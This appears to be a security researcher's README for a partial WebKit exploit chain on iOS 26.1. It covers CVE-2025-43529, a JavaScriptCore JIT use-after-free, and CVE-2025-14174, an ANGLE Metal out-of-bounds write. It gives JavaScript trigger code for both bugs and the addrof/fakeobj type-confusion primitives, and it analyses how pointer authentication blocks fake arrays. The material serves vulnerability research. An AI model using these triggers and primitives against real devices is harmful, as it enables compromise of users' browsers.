# WebKit-UAF-ANGLE-OOB-Analysis (CVE-2025-43529, CVE-2025-14174)

Notes and PoC material for a WebKit/ANGLE chain on iOS 26.1. This is not a full exploit; it separates verified primitives from the pieces that still fail.

**Author:** [0xjohnny](https://x.com/0xjohnny)<br>
**Based on:** [jir4vv1t's CVE-2025-43529 exploit](https://github.com/jir4vv1t/CVE-2025-43529) — the UAF trigger, butterfly reclaim, and `addrof`/`fakeobj` primitives are theirs. My additions are the ANGLE OOB plumbing, PAC-focused analysis, and iOS 26.1 validation.<br>
**Status:** Partial chain; arbitrary R/W not proven<br>
**Test Device:** iPhone 11 Pro Max, iOS 26.1<br>
**Last Updated:** January 2026

## Overview

Two WebKit CVEs disclosed together and reported as in-the-wild use by Apple.

| CVE | Component | Type | Summary |
|-----|-----------|------|---------|
| CVE-2025-43529 | JavaScriptCore | Use-After-Free | DFG JIT missing write barrier leads to GC freeing live objects |
| CVE-2025-14174 | ANGLE (GPU) | Out-of-Bounds Write | Metal backend uses wrong height for staging buffer allocation |

## CVE-2025-43529: WebKit DFG Store Barrier UAF

### Root Cause

The bug is in JavaScriptCore's DFG JIT, specifically the Store Barrier Insertion Phase (`DFGStoreBarrierInsertionPhase.cpp`).

When a Phi node escapes but its Upsilon inputs are not marked as escaped, later stores miss a write barrier. That allows GC to free objects that are still reachable.

### Trigger Mechanism

```javascript
function triggerUAF(flag, k, allocCount) {
    let A = { p0: 0x41414141, p1: 1.1, p2: 2.2 };
    arr[arr_index] = A;  // A in old space

    let a = new Date(1111);
    a[0] = 1.1;  // Creates butterfly for Date

    // Force GC
    for (let j = 0; j < allocCount; ++j) {
        forGC.push(new ArrayBuffer(0x800000));
    }

    let b = { p0: 0x42424242, p1: 1.1 };

    // Phi node - the bug
    let f = b;
    if (flag) f = 1.1;

    A.p1 = f;  // Phi escapes, but 'b' NOT marked as escaped

    // Long loop = GC race window
    for (let i = 0; i < 1e6; ++i) { /* ... */ }

    b.p1 = a;  // NO WRITE BARRIER - 'a' freed while still reachable
}
```

### Exploitation sketch

The freed Date's butterfly can be reclaimed by spray arrays, creating a type confusion:

```javascript
// After reclaim:
boxed_arr[0] = obj;           // Store object reference
addr = ftoi(unboxed_arr[0]);  // Read as float64 = leaked address

unboxed_arr[0] = itof(addr);  // Write address as float64
fake = boxed_arr[0];          // Read as object = fakeobj
```

## CVE-2025-14174: ANGLE Metal Backend OOB Write

### Root cause

In ANGLE's Metal backend (`TextureMtl.cpp`), staging buffer allocation uses `UNPACK_IMAGE_HEIGHT` instead of actual texture height when uploading via PBO.

### Trigger

```javascript
gl.pixelStorei(gl.UNPACK_IMAGE_HEIGHT, 16);  // Small value

// Staging buffer: 256 * 16 * 4 = 16KB
// Actual write:   256 * 256 * 4 = 256KB
// OOB: 240KB!

gl.texImage2D(gl.TEXTURE_2D, 0, gl.DEPTH_COMPONENT32F,
              256, 256, 0, gl.DEPTH_COMPONENT, gl.FLOAT, 0);
```

## The PAC problem

On arm64e (iPhone 11 Pro Max), Pointer Authentication Codes protect critical JSC pointers:

| Pointer | Protected | Result |
|---------|-----------|--------|
| TypedArray `m_vector` | Yes | Cannot fake TypedArray with arbitrary backing store |
| JSArray `butterfly` | Yes | Cannot fake JSArray with arbitrary butterfly |

Trying to create a fake TypedArray/JSArray with an arbitrary data pointer fails PAC verification and crashes:

```
Exception: EXC_BAD_ACCESS
KERN_INVALID_ADDRESS at 0x0001fffffffffffc -> 0x0000007ffffffffc
(possible pointer authentication failure)
```

The original type confusion works because both arrays use legitimately signed butterfly pointers — it's just reinterpreting the same memory. Fake objects with arbitrary unsigned pointers crash on the PAC check.

Unproven bypass avenues:

1. JIT paths that use a signed pointer from a legitimate object without re-authenticating attacker-controlled fields.
2. A reachable signing gadget or API that signs a controlled data pointer with the right context.
3. A different use of the ANGLE OOB that avoids fake TypedArray/JSArray backing stores entirely.

## Current capabilities

| Primitive | Status | Notes |
|-----------|--------|-------|
| `addrof(obj)` | Working | Verified in probe |
| `fakeobj(addr)` | Working | Verified against known objects |
| Address leaking | Working | 20+ addresses per run |
| Inline slot read/write | Working | Verified on known inline slots (object-address-based) |
| `read64(addr)` | Unverified | Constructed via inline-slot trick, proof failed |
| `write64(addr)` | Unverified | Constructed via inline-slot trick, proof failed |

Also unverified: renderer→GPU escape chain, sandbox escape. The ANGLE WebGL2 PBO probe is implemented but the trigger isn't confirmed in current runs.

## Repository structure

```
├── README.md                 # This file
├── poc/
│   └── chained_exploit_probe.html
└── analysis/
    ├── pac_analysis.md       # Detailed PAC findings
    └── crash_logs/           # Example crash reports
```

## References

- [jir4vv1t/CVE-2025-43529](https://github.com/jir4vv1t/CVE-2025-43529) — original UAF exploit and analysis
- WebKit Bugzilla: 302502, 303614
- Apple Security Updates — iOS 26
- Google Threat Analysis Group
